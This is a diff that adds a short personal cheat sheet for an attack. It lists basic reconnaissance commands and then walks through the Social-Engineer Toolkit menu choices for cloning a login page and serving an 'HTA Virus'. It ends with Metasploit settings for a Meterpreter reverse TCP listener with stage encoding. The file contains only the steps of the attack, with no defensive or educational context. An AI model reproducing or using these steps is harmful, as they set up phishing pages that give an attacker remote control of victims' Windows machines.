@@ -1,0 +1,24 @@
+whoami
+ifconfig
+ping facebook.com
+--------------------------------
+
+#HTA Virus
+
+setoolkit
+1 (Socail Engerinnering attacks)
+2 (Website Attack Vectors)
+7 (HTA Attack Method)
+2 (Site Cloner)
+
+enter any website login page
+enter the ip address
+443
+3 (Meterpreter Reverse TCP)
+set payload windows/meterpreter/reverse_tcp
+set LHOST ipaddress
+set LPORT 443/1235 whichever works
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+
